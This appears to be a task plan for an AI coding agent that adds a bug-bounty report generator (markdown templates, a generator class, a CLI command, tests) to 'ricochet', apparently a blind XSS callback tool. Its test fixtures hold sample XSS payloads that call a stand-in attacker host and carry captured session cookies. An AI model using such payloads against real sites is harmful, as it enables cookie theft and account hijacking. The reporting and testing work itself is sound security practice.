---
phase: 08-triggers-reporting
plan: 05
type: execute
wave: 2
depends_on: ["08-04"]
files_modified:
  - ricochet/reporting/__init__.py
  - ricochet/reporting/generator.py
  - ricochet/reporting/templates.py
  - ricochet/cli.py
  - tests/test_reporting.py
autonomous: true

must_haves:
  truths:
    - "User can generate bug bounty report with PoC steps"
    - "Report includes summary, severity, steps to reproduce, impact"
    - "Report format is markdown (HackerOne/Bugcrowd compatible)"
    - "Report incorporates captured metadata when available"
  artifacts:
    - path: "ricochet/reporting/__init__.py"
      provides: "Module exports for reporting"
    - path: "ricochet/reporting/generator.py"
      provides: "ReportGenerator class"
      exports: ["ReportGenerator", "generate_report"]
    - path: "ricochet/reporting/templates.py"
      provides: "Bug bounty report templates"
      exports: ["XSS_TEMPLATE", "SQLI_TEMPLATE", "SSTI_TEMPLATE"]
    - path: "tests/test_reporting.py"
      provides: "Tests for report generation"
  key_links:
    - from: "ricochet/reporting/generator.py"
      to: "ricochet/output/finding.py"
      via: "Finding dataclass for report data"
      pattern: "from ricochet\\.output\\.finding import Finding"
    - from: "ricochet/cli.py"
      to: "ricochet/reporting/generator.py"
      via: "cmd_report import"
      pattern: "from ricochet\\.reporting import"
---

<objective>
Implement bug bounty report generator

Purpose: Generate professional markdown reports from findings that are ready to submit to HackerOne/Bugcrowd. Reports include PoC steps, captured metadata as evidence, impact assessment, and remediation guidance.

Output: ReportGenerator class with templates, CLI `report` subcommand, markdown output.
</objective>

<execution_context>
@~/.claude/get-shit-done/workflows/execute-plan.md
@~/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/08-triggers-reporting/08-RESEARCH.md

# Existing infrastructure
@ricochet/output/finding.py
@ricochet/core/store.py
@ricochet/cli.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create report templates</name>
  <files>ricochet/reporting/__init__.py, ricochet/reporting/templates.py</files>
  <action>
Create reporting module with templates:

1. Create `ricochet/reporting/__init__.py`:
   - Export ReportGenerator, generate_report, templates

2. Create `ricochet/reporting/templates.py` with template strings (from research):

   - `XSS_TEMPLATE`:
     ```python
     XSS_TEMPLATE = '''## Summary
{vuln_type} vulnerability in `{parameter}` parameter at `{target_url}`

## Severity
{severity_upper} - {severity_reasoning}

## Description
A {vuln_subtype} XSS vulnerability exists in the `{parameter}` parameter of the `{endpoint}` endpoint. When a malicious payload is submitted, it is {storage_behavior} and later executed in the context of {execution_context}.

## Steps to Reproduce
1. Navigate to: `{injection_url}`
2. Enter the following payload in the `{parameter}` field:
   ```
   {payload}
   ```
3. Submit the form/request
4. {trigger_step}
5. Observe callback received at: `{callback_url}`

## Proof of Concept
- **Correlation ID:** `{correlation_id}`
- **Injection Point:** `{target_url}` (parameter: `{parameter}`)
- **Payload Used:** `{payload}`
- **Callback Received:** {callback_timestamp}
- **Delay:** {delay_seconds:.1f} seconds

{metadata_section}

## Impact
An attacker can:
- Execute arbitrary JavaScript in victims' browsers
- Steal session cookies and hijack user accounts (if not HttpOnly)
- Perform actions on behalf of authenticated users
- Access sensitive data displayed on the page
{custom_impact}

## Remediation
- Implement proper output encoding (HTML entity encoding for HTML context)
- Use Content-Security-Policy headers to restrict inline script execution
- Set HttpOnly flag on sensitive cookies
- Implement input validation on the server side

## References
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: Improper Neutralization of Input During Web Page Generation
'''
     ```

   - `SQLI_TEMPLATE`:
     Similar structure but for SQL injection (out-of-band)
     - Mentions database access, data exfiltration
     - References CWE-89

   - `SSTI_TEMPLATE`:
     Similar structure but for SSTI
     - Mentions RCE potential, server-side execution
     - References CWE-94

   - `GENERIC_TEMPLATE`:
     Fallback for unknown contexts
  </action>
  <verify>
```bash
cd /Users/aidan/projects/security/ricochet
python -c "from ricochet.reporting.templates import XSS_TEMPLATE; print(XSS_TEMPLATE[:100])"
```
  </verify>
  <done>Templates exist for XSS, SQLi, SSTI with proper structure</done>
</task>

<task type="auto">
  <name>Task 2: Create ReportGenerator class</name>
  <files>ricochet/reporting/generator.py</files>
  <action>
Create the report generator:

1. Create `ricochet/reporting/generator.py` with:

   - `ReportGenerator` class:
     - __init__(finding: Finding)
     - _select_template() -> str: Choose template based on finding.context
     - _build_metadata_section() -> str:
       If finding.has_metadata:
         Format captured data nicely
         Include: URL where XSS fired, cookies (note if empty/HttpOnly), user-agent, DOM snippet
       Else:
         Return "No metadata captured (use exfiltration payloads for richer data)"

     - _derive_severity_reasoning() -> str:
       Based on context and delay:
       - Stored XSS (delay > 60s) = higher severity
       - Admin context = higher severity
       - Cookie capture = higher severity

     - _infer_execution_context() -> str:
       Try to infer from metadata URL or delay
       - Long delay (>1hr): "likely admin/moderation queue"
       - metadata.url contains "/admin": "admin panel"
       - Default: "unknown context (possibly admin panel or moderation queue)"

     - generate() -> str:
       Fill template with finding data
       Return complete markdown report

   - `generate_report(finding: Finding) -> str`:
     Convenience function wrapping ReportGenerator

Use datetime.fromtimestamp for callback_timestamp formatting.
  </action>
  <verify>
```bash
cd /Users/aidan/projects/security/ricochet
python -c "
from ricochet.output.finding import Finding
from ricochet.reporting.generator import generate_report
f = Finding(
    correlation_id='abc123def456', target_url='https://example.com/submit',
    parameter='comment', payload='<script>fetch(\"http://cb/abc\")</script>',
    context='xss:html', injected_at=1706000000, callback_id=1,
    source_ip='10.0.0.5', request_path='/abc123def456',
    callback_headers={}, callback_body=None, received_at=1706003600, delay_seconds=3600
)
report = generate_report(f)
print(report[:200])
"
```
  </verify>
  <done>ReportGenerator produces markdown reports with all required sections</done>
</task>

<task type="auto">
  <name>Task 3: Add report CLI subcommand and tests</name>
  <files>ricochet/cli.py, tests/test_reporting.py</files>
  <action>
1. Add `report` subcommand to CLI:

   ```python
   report_parser = subparsers.add_parser(
       'report',
       help='Generate bug bounty report from findings'
   )
   ```

   Arguments:
   - --correlation-id (optional): Generate report for specific finding
   - --output / -o (optional): Write report to file (default: stdout)
   - --format (default: markdown): Report format (only markdown for v1)
   - --all: Generate reports for all findings (separate files)

   cmd_report(args, store) -> int:
   - If --correlation-id: generate single report
   - If --all: generate reports for all findings (with callbacks)
   - Write to file if --output, else stdout
   - Print summary of generated reports

2. Create `tests/test_reporting.py`:
   - Test ReportGenerator with XSS finding (with metadata)
   - Test ReportGenerator with XSS finding (without metadata)
   - Test ReportGenerator with SQLi finding
   - Test ReportGenerator with SSTI finding
   - Test generate_report convenience function
   - Test report contains required sections (Summary, Steps to Reproduce, Impact)

Use pytest, create Finding fixtures with different contexts.
  </action>
  <verify>
```bash
cd /Users/aidan/projects/security/ricochet
python -m ricochet report --help
python -m pytest tests/test_reporting.py -v
```
  </verify>
  <done>`ricochet report --help` shows options, tests verify report content</done>
</task>

</tasks>

<verification>
```bash
cd /Users/aidan/projects/security/ricochet

# Module imports
python -c "from ricochet.reporting import ReportGenerator, generate_report"

# CLI command available
python -m ricochet report --help | grep -E "(correlation-id|output)"

# Generate sample report
python -c "
from ricochet.output.finding import Finding
from ricochet.reporting import generate_report
import json

f = Finding(
    correlation_id='abc123def456abcd', target_url='https://example.com/feedback',
    parameter='message', payload='<script>fetch(\"http://attacker.com/abc123def456abcd\")</script>',
    context='xss:html', injected_at=1706000000, callback_id=1,
    source_ip='10.0.0.5', request_path='/abc123def456abcd?c=session%3Dabc',
    callback_headers={'User-Agent': 'Mozilla/5.0'},
    callback_body=json.dumps({'url': 'https://example.com/admin/tickets', 'cookies': 'session=abc123', 'ua': 'Mozilla/5.0'}).encode(),
    received_at=1706007200, delay_seconds=7200
)
report = generate_report(f)
print(report)
" | head -50

# Tests pass
python -m pytest tests/test_reporting.py -v
```
</verification>

<success_criteria>
- ReportGenerator produces markdown reports with:
  - Summary with vulnerability type and parameter
  - Severity with reasoning
  - Steps to Reproduce with payload
  - PoC section with correlation ID and timestamps
  - Captured metadata section (when available)
  - Impact assessment
  - Remediation guidance
- `ricochet report --correlation-id ID` generates report for specific finding
- Reports are HackerOne/Bugcrowd compatible markdown format
- Templates exist for XSS, SQLi, SSTI vulnerability types
</success_criteria>

<output>
After completion, create `.planning/phases/08-triggers-reporting/08-05-SUMMARY.md`
</output>
